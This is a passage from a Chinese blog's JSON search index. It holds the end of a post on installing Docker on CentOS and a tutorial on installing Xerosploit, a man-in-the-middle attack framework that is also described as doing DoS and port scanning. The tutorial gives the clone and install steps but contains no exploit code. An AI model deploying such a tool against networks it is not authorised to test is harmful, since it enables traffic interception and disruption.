http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm yum install -y docker-io 最后解释一下发错误安装步骤的原因1.有些东西可能是能用的，只是本人技术不到家不知道错误在哪里而已 2.上面有些装的工具在以后对你可能有帮助(yum-config-manager) 3.只有经历了错误才会有所成长","categories":[{"name":"随笔","slug":"随笔","permalink":"http://lincso.cn/categories/随笔/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://lincso.cn/tags/docker/"}]},{"title":"Xerosploit","slug":"xerosploit框架安装","date":"2018-10-24T04:18:53.000Z","updated":"2020-02-13T08:35:54.356Z","comments":true,"path":"2018/10/24/xerosploit框架安装/","link":"","permalink":"http://lincso.cn/2018/10/24/xerosploit框架安装/","excerpt":"一个灰常流逼的框架 xerosploit(中间人攻击框架)xerosploit是一个渗透测试工具集，它的目的是执行中间人攻击来进行测试，包含了各种各样的模块来实现高效的攻击，同时也能执行dos攻击和端口扫描。由bettercap和nmap提供支持。","text":"一个灰常流逼的框架 xerosploit(中间人攻击框架)xerosploit是一个渗透测试工具集，它的目的是执行中间人攻击来进行测试，包含了各种各样的模块来实现高效的攻击，同时也能执行dos攻击和端口扫描。由bettercap和nmap提供支持。 OK，废话不多说直接上教程 我们需要装一个git，emmm毕竟我们要下载这个文件(装过的同学直接跳过此部)yum install -y git 查看版本号(git –version) 不知道为什么本人就安装了这个发现就可以直接运行了git clone了 如何发现不行的话可以配一下git环境哦！！！ 下载git源码 先cd /usr/src存放包 wget https://www.kernel.org/pub/software/scm/git/git-2.8.3.tar.gz tar -zxvf git-2.8.3.tar.gz cd git-2.8.3 配置git安装路径 ./configure prefix-=/usr/local/git/（关于configure是什么） 编译安装 make &amp;&amp; make install 将git指令添加到bash中 vi /etc/profile 在最后一行加入 export PATH=$PATH:/usr/local/git/bin（这一步是跟上面的configure是有关的，因为刚装git后的路径不在这里，不信可以wheris看一下） 让该配置文件立即生效 source /etc/profile 好了接下来安装xerosploitgit clone https://github.com/LionSec/xerosploit.git 安装成功后就可以cd到xerosploit这个目录下了 进入后先ls看一下，里面有一个install.py的文件 ./install.py运行就好了（记住选1，不然我也不会了） 还有如果用centos是不能直接用的因为这个py文件用的时apt-get，emmm毕竟centos的同学用的是yum（关于centos装apt-get） 完成之后就可以用了。。。","categories":[{"name":"Kali学习笔记","slug":"Kali学习笔记","permalink":"http://lincso.cn/categories/Kali学习笔记/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://lincso.cn/tags/网络安全/"}]}]}